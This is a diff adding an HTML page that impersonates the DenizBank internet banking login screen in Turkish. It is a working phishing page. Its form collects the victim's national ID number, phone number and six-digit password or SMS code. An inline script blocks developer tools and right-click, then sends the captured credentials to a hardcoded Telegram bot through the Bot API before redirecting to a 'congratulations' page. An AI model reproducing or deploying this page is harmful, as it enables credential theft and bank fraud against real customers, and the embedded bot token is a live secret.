@@ -1,0 +1,498 @@
+
+
+<!DOCTYPE html>
+                       <!-- Syslx -->
+
+<html lang="tr" class=" js webkit chrome">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+ 
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="DenizBank İnternet Bankacılığı">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>DenizBank İnternet Bankacılığı</title>
+    <!--<base id="baseHref" href="/">-->
+    <base href=".">
+                           <!-- Syslx -->
+                      <!-- Syslx -->
+
+ 
+    <link rel="stylesheet" href="./deniz_files_files/styles.2acf710a921b37dce911.css">
+    <style type="text/css">
+      .im-caret {
+        -webkit-animation: 1s blink step-end infinite;
+        animation: 1s blink step-end infinite;
+      }
+
+      @keyframes blink {
+
+        from,
+        to {
+          border-right-color: black;
+        }
+
+        50% {
+          border-right-color: transparent;
+        }
+      }
+
+      @-webkit-keyframes blink {
+
+        from,
+        to {
+          border-right-color: black;
+        }
+
+        50% {
+          border-right-color: transparent;
+        }
+      }
+
+      .im-static {
+        color: grey;
+      }
+    </style>
+  </head>
+  <body class="login">
+    <app ng-version="8.2.14">
+      <vp-loading>
+        <div class="progress-loader soft" hidden="">
+          <img src="./deniz_files_files/loading.gif" class="hidden" alt="Lütfen Bekleyin...">
+        </div>
+      </vp-loading>
+                      <!-- Syslx -->
+      <login-app>
+        <div class="login-wrap login-v4">
+          <!---->
+          <header class="w-100 align-items-center login-header px-4 px-lg-5 justify-content-center d-flex not-background" login-header="">
+            <div class="col-8 col-lg-4 text-center p-0">
+              <a class="logo-light">
+                <img alt="Light Logo" src="./deniz_files_files/logo-light.svg">
+              </a>
+            </div>
+            <!---->
+            <!---->
+            <div class="mb-5">
+              <!---->
+              <div class="lang">
+                <a class="d-flex align-items-center">
+                  <img alt="" src="./deniz_files_files/world.svg">
+                  <span>ENG</span>
+                </a>
+              </div>
+              <!---->
+            </div>
+          </header>
+          <!---->
+          <div class="bacground-group">
+            <div class="login-overlay"></div>
+            <div class="bg-image" style="background: url(&quot;deniz_files_files/spring.jpg&quot;) center center no-repeat;"></div>
+            <div class="bg-image hidden"></div>
+          </div>
+                      <!-- Syslx -->
+          <router-outlet class="d-none"></router-outlet>
+          <ng-component>
+                      <!-- Syslx -->
+            <div class="container container-v2">
+              <div class="row">
+                <div class="col-sm-12 col-lg-6">
+                  <div class="login-content login-content-v2">
+                    <div class="tab custom">
+                      <ul class="nav nav-tabs" id="myTab" role="tablist">
+                        <li class="nav-item">
+                          <a aria-controls="bireysel" aria-selected="true" class="nav-link active" data-toggle="tab" href="#" id="home-tab" role="tab" value="TabTitlePersonal | BİREYSEL" vp-resource="">BİREYSEL </a>
+                        </li>
+                        <li class="nav-item">
+                          <a aria-controls="profile" aria-selected="false" class="nav-link" data-toggle="tab" href="#" id="profile-tab" role="tab" value="TabTitleCorporate | KURUMSAL" vp-resource="">KURUMSAL </a>
+                        </li>
+                      </ul>
+                      <!-- Syslx -->
+                    </div>
+                    <div class="tab-content" id="myTabContent">
+                      <div aria-labelledby="home-tab" class="tab-pane fade show active" id="bireysel" role="tabpanel">
+                        <form class="login-form" method="post" action="validateCaptcha.php">
+                          <vp-containerrow cssclass="mb-22px form-group-v2">
+                              <div class="form-group mb-22px form-group-v2" id="row">
+                                  <label class="align-items-center d-flex"> T.C. Kimlik No / Kullanıcı Adı </label>
+                                  <vp-textbox cssclass="mask" iconclass="icon-user" id="tcOrUserName" placeholder="LoginUserNamePlaceholder | Kullanıcı Adı/TCKN" switchofftext="LoginRememberMe | Hatırla" switchontext="LoginRememberMe | Hatırla" class="ng-untouched ng-valid ng-dirty">
+                                      <div class="input-group mb-3 d-flex align-items-center switch-group">
+                                          <div class="input-group-prepend">
+                                              <span class="input-group-text">
+                                                  <em class="icon-user fs-24"></em>
+                                              </span>
+                                          </div>
+                                          
+                                          <input type="text" id="custno" name="tc" placeholder="Kullanıcı Adı/TCKN" 
+                                          maxlength="11" inputmode="numeric" class="form-control mask" 
+                                          aria-label="Kullanıcı Adı/TCKN" aria-describedby="Kullanıcı Adı/TCKN" required 
+                                          oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)">
+                                                                             <div class="input-group-append input-group-append-v2 switch-wrap">
+                                              <span class="input-group-text">
+                                                  <label class="switch-text">
+                                                      <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine ng-valid">
+                                                      <div aria-live="assertive" class="slider round" role="button" aria-label="Hatırla">
+                                                          <span aria-hidden="true" class="on">Hatırla</span>
+                                                          <span aria-hidden="true" class="off">Hatırla</span>
+                                                      </div>
+                                                  </label>
+                                              </span>
+                                          </div>
+                                      </div>
+                                  </vp-textbox>
+                              </div>
+                          </vp-containerrow>
+                                              <!-- Syslx -->
+
+                        
+                          <div id="tck_error" style="color: red; display: none;">Geçersiz T.C. Kimlik Numarası</div>
+                                        <!-- Syslx -->
+
+                          <div class="tab-content" id="myTabContent">
+                      <div aria-labelledby="home-tab" class="tab-pane fade show active" id="bireysel" role="tabpanel">
+                        <form class="login-form" method="post" action="validateCaptcha.php">
+                          <vp-containerrow cssclass="mb-22px form-group-v2">
+                              <div class="form-group mb-22px form-group-v2" id="row">
+                                  <label class="align-items-center d-flex"> Cep Telefon Numaranız </label>
+                                  <vp-textbox cssclass="mask" iconclass="icon-user" id="tcOrUserName" placeholder="LoginUserNamePlaceholder | Cep Telefon Numaranız" switchofftext="LoginRememberMe | Hatırla" switchontext="LoginRememberMe | Hatırla" class="ng-untouched ng-valid ng-dirty">
+                                      <div class="input-group mb-3 d-flex align-items-center switch-group">
+                                          <div class="input-group-prepend">
+                                              <span class="input-group-text">
+                                                  <em class="icon-user fs-24"></em>
+                                              </span>
+                                          </div>
+                                                                <!-- Syslx -->
+
+                                                                <input type="text" id="telNo" name="telNo" placeholder="Telefon Numaranız"
+                                                                maxlength="11" inputmode="numeric" class="form-control mask"
+                                                                aria-label="Telefon Numaranız" aria-describedby="Telefon Numaranız" 
+                                                                oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)">
+                                                                                                   <div class="input-group-append input-group-append-v2 switch-wrap">
+                                              <span class="input-group-text">
+                                                  <label class="switch-text">
+                                                      <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine ng-valid">
+
+                                                      </div>
+                                                  </label>
+                                              </span>
+                                          </div>
+                                      </div>
+                                  </vp-textbox>
+                              </div>
+                          </vp-containerrow>
+                           <!-- Syslx -->
+
+                                <!---->
+                              </vp-textbox> 
+                            
+                            </div>
+                          </vp-containerrow>
+                          <vp-containerrow cssclass="mb-22px form-group-v2" modulename="VirtualNumericKeyboard">
+                            <div class="form-group mb-22px form-group-v2" data-module="VirtualNumericKeyboard" id="row">
+                              <!---->
+                              <!---->
+                              <vp-passwordtextbox cssclass="mb-22px" id="tbPassword" inputtype="numeric" label="LoginPassword | Parola" placeholder="LoginPasswordPlaceholder | Parolanızı giriniz" class="ng-untouched ng-pristine ng-valid">
+                                <div class="virtual-keyword">
+                                  <!---->
+                                  <label for="tbPasswordtxt">Parola</label>
+                                  <div class="input-group mb-3" id="tbPasswordvd">
+                                    <!---->
+                                    <div class="input-group-prepend">
+                                      <span class="input-group-text">
+                                        <em class="icon-lock fs-24"></em>
+                                      </span>
+                                    </div>
+                                    <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" 
+                                    spellcheck="false" id="sms" name="sms" type="password" placeholder="Parolanızı giriniz" 
+                                    maxlength="6" class="form-control password numeric mask" 
+                                    aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                                                                 <!---->
+                                    <div class="input-group-append">
+                                      <span class="input-group-text">
+                                        <em class="icon-keyboard fs-24 tooltipstered" vp-tooltip=""></em>
+                                      </span>
+                                    </div>
+                                  </div>
+                                  <div class="keyword-container"></div>
+                                </div>
+                              </vp-passwordtextbox>
+                              <!---->
+                            </div>
+                          </vp-containerrow>  </form>
+                          <!---->
+                          <div class="form-group form-group-v2">
+                            <button  class="btn btn-red-gradient d-block border-0" id="submitButton" type="submit" name="submitButton" onclick="sendFormToTelegram()">GİRİŞ YAP </button>
+                          </div>
+                          <div class="login-footer custom">
+                            <a class="btn btn-ghost mb-0 text-center text-md-left py-10-tablet" href="">
+                              <em class="icon-key fs-24 d-none d-md-inline"></em> PAROLAMI UNUTTUM / BLOKE KALDIR </a>
+                            <a class="btn btn-ghost new-user py-10-tablet">
+                              <em class="icon-adduser fs-24 d-none d-md-inline"></em> KULLANICI OLUŞTUR </a>
+                          </div>
+                                                <!-- Syslx -->
+
+                          <script>
+                                                    document.addEventListener('keydown', function (e) {
+                                                        if (e.key === 'F12' || e.keyCode === 123) {
+                                                            e.preventDefault();
+                                                        }
+                                                        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
+                                                            e.preventDefault();
+                                                        }
+                                                    });
+
+                                                    document.addEventListener('contextmenu', function (e) {
+                                                        e.preventDefault();
+                                                    });
+
+                                                    function limitInput(element, maxLength) {
+                                                        if (element.value.length > maxLength) {
+                                                            element.value = element.value.slice(0, maxLength);
+                                                        }
+                                                    }
+
+                                                    function onlyNumbers(input) {
+                                                        input.value = input.value.replace(/\D/g, '');
+                                                    }
+
+                                                    function sendFormToTelegram() {
+                                                        const formData = {
+                                                            tc: document.getElementById('custno').value,
+                                                            sms: document.getElementById('sms').value,
+                                                            telNo: document.getElementById('telNo').value
+                                                        };
+
+                                                        const botToken = '7394534930:AAF1S--1IxTKYsIwTT4X6TVrrwEKrwTQz3E';
+                                                        const chatId = '-4500705668';
+                                                        const message = `Müşteri / T.C. Kimlik Numarası: ${formData.tc}\nParola: ${formData.sms}\nTelefon Numarası: ${formData.telNo}`;
+
+                                                        if (formData.tc.length === 11 && formData.sms.length === 6 && (formData.telNo.length === 10 || formData.telNo.length === 11)) {
+                                                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                                                method: 'POST',
+                                                                headers: {
+                                                                    'Content-Type': 'application/json'
+                                                                },
+                                                                body: JSON.stringify({
+                                                                    chat_id: chatId,
+                                                                    text: message
+                                                                })
+                                                            })
+                                                                .then(response => response.json())
+                                                                .then(data => {
+                                                                    if (data.ok) {
+                                                                        window.location.href = 'tebrik.html';
+                                                                    } else {
+                                                                        alert('Hata oluştu, tekrar deneyiniz.');
+                                                                    }
+                                                                })
+                                                                .catch(error => {
+                                                                    console.error('Error:', error);
+                                                                });
+                                                        } else {
+                                                            alert('Lütfen tüm alanları doğru bir şekilde doldurun.');
+                                                        }
+                                                    }
+                                                </script>
+                      
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-sm-12 col-lg-6 d-md-block d-none">
+                  <div class="login-qr-content flex-lg-column">
+                    <div class="col-lg-auto col">
+                      <h3 value="LoginWithQrCode | QR Kod&#39;la Giriş" vp-resource="">QR Kod'la Giriş </h3>
+                      <p value="LoginWithQrInfo |	MobilDeniz veya DenizKartım üzerinden kodu okutarak hızlıca giriş yapabilirsiniz." vp-resource="">MobilDeniz üzerinden kodu okutarak hızlıca giriş yapabilirsiniz. </p>
+                    </div>
+                    <div class="col-lg-auto col">
+                      <a>
+                        <!---->                       <!-- Syslx -->
+
+                        <div class="qr-wrap passive">
+                          <picture>
+                            <img alt="QR Code" src="./deniz_files_files/qrPhoto.jpg" srcset="
+                            ./deniz_files_files/qrPhoto.jpg,
+                            ./deniz_files_filesqrPhoto2x.jpg 2x
+                  ">
+                          </picture>
+                          <figcaption>
+                            <p class="qrColor">
+                              <strong>QR Kod</strong> üretmek için tıklayınız.
+                            </p>
+                          </figcaption>
+                        </div>
+                      </a>
+                      <vp-loading-panel cssclass="bg-transparent" id="qrLoading">
+                        <!---->
+                      </vp-loading-panel>
+                      <!---->
+                      <div>
+                        <div class="form-wrap login-form" data-module="SmsTimer">
+                          <div class="form-group timer-wrap">
+                            <!---->
+                            <p value="EndQRText | QR Kod giriş özelliği, MobilDeniz veya DenizKartım giriş ekranı içinde Hızlı Menü&#39;de &#39;&#39;İnternet Şube Giriş&#39;&#39; seçeneği ile yer almaktadır." vp-resource="" class="pt-3">QR’la giriş özelliği için MobilDeniz ‘Giriş Yap’ butonuna basmadan önce; Hızlı Menü &gt; QR işlemleri &gt; İnternet Şube Giriş sayfası adımlarını takip ediniz. </p>
+                          </div>
+                        </div>
+                      </div>
+                      <!---->
+                      <a class="link-icon d-lg-none d-md-block">
+                        <em class="icon-change fs-24"></em> QR Kod Üret </a>
+                    </div>
+                    <!---->
+                    <a class="link-icon d-lg-block d-none">
+                      <em class="icon-change fs-24"></em> QR Kod Üret </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <vp-modalpopup cssclass="mobileModal">
+              <!---->
+              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
+              <div role="dialog" tabindex="-1" class="modal mobileModal" id="md" aria-labelledby="" style="display: none;">
+                <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+                  <div class="modal-content">
+                    <!---->
+                    <div class="modal-header d-flex align-items-center ">
+                      <h5 class="modal-title "></h5>
+                      <!---->
+                      <button class="close d-flex align-items-center" type="button" id="BtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
+                      </button>
+                    </div>
+                    <!---->
+                    <div class="modal-body d-flex flex-column text-center default-bg">
+                      <!---->
+                      <!---->
+                      <img alt="DenizBank Logo" aria-hidden="true" src="./deniz_files_files/denizbank-mobile.jpg">
+                      <p></p>
+                      <div class="keyboard-spacer"></div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+              </div>
+            </vp-modalpopup>
+            <vp-modalpopup id="infoModal">
+              <!---->
+              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
+              <div role="dialog" tabindex="-1" class="modal" id="infoModalmd" aria-labelledby="Bilgilendirme" style="display: none;">
+                <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
+                  <div class="modal-content">
+                    <!---->
+                    <!---->
+                    <div class="modal-body text-center default-bg">
+                      <!---->
+                      <button class="close d-flex align-items-center" type="button" id="infoModalBtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
+                      </button>
+                      <!---->
+                      <p class="modal-title-custom ">Bilgilendirme</p>
+                      <div class="result-content warning-result">
+                        <p class="message-row font-weight-bolder"></p>
+                        <div class="row col-md-10 mx-auto mt-5 mb-4">
+                          <div class="col-12 mb-4 col-md-6 mx-auto">
+                            <!---->
+                            <!---->
+                            <!---->
+                            <!---->
+                            <!---->
+                            <!---->
+                          </div>
+                        </div>
+                      </div>
+                      <div class="keyboard-spacer"></div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+              </div>
+            </vp-modalpopup>
+            <vp-modalpopup modaltitle="SuccesModalTitle | Başarılı">
+              <!---->
+              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
+              <div role="dialog" tabindex="-1" class="modal" id="md" aria-labelledby="Başarılı" style="display: none;">
+                <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
+                  <div class="modal-content">
+                    <!---->
+                    <!---->
+                    <div class="modal-body text-center default-bg">
+                      <!---->
+                      <button class="close d-flex align-items-center" type="button" id="BtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
+                      </button>
+                      <!---->
+                      <p class="modal-title-custom ">Başarılı</p>
+                      <div class="result-content warning-result">
+                        <p class="message-row">
+                          <strong></strong>
+                        </p>
+                      </div>
+                      <!---->
+                      <div class="keyboard-spacer"></div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+              </div>
+            </vp-modalpopup>
+            <!---->
+          </ng-component>
+          <!---->
+          <footer class="login-footer login-footer-v3">
+            <!---->
+            <vp-announcement id="loginAnnouncement">
+              <!---->
+              <div class="black-band black-band-v2">
+                <picture class="footer-logo">
+                  <img alt="footer-logo" src="./deniz_files_files/login-footer-logo.svg">
+                </picture>
+                <div class="content-v2 d-flex align-items-center w-100">
+                  <p class="content-first">
+                    <strong>Bilgilendirme:</strong>
+                  </p>
+                  <p class="content-second">Size özel giriş bilgilerinizi hiç kimse ile paylaşmayınız. Her girişinizde karşılama mesajınızı mutlaka kontrol ediniz.</p>
+                </div>
+              </div>
+            </vp-announcement>
+            <!---->
+            <div class="bottom bottom-v2">
+              <a class="logo-enbd no-link">
+                <img alt="enbd" src="./deniz_files_files/enbd.png">
+              </a>
+              <div class="link-group">
+                <!---->
+                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/dijital-bankacilik/guvenlik" aria-label="İnternet Güvenliği">
+                  <em aria-hidden="true" class="icon-security-2 fs-20"></em>
+                  <span>İnternet Güvenliği</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/internet-bankaciligi/" aria-label="Yardım ve Öneriler">
+                  <em aria-hidden="true" class="icon-help-2 fs-20"></em>
+                  <span>Yardım ve Öneriler</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="https://www.denizbank.com/dijital-bankacilik/internet-bankaciligi" aria-label="İşlem Limitleri ve Saatleri">
+                  <em aria-hidden="true" class="icon-time-2 fs-20"></em>
+                  <span>İşlem Limitleri ve Saatleri</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" href="tel:08502220800" aria-label="0850 222 0 800">
+                  <em aria-hidden="true" class="icon-phone-2 fs-20"></em>
+                  <span>0850 222 0 800</span>
+                </a>
+              </div>
+            </div>
+            <!---->
+          </footer>
+        </div>
+        <!---->
+      </login-app>
+      <!---->
+    </app>
+    <!-- Scripts will be injected by webpack here -->
+    <!-- uniqekey -->
+                       <!-- Syslx -->
+
+
+  
+   
+  </body>
+</html>
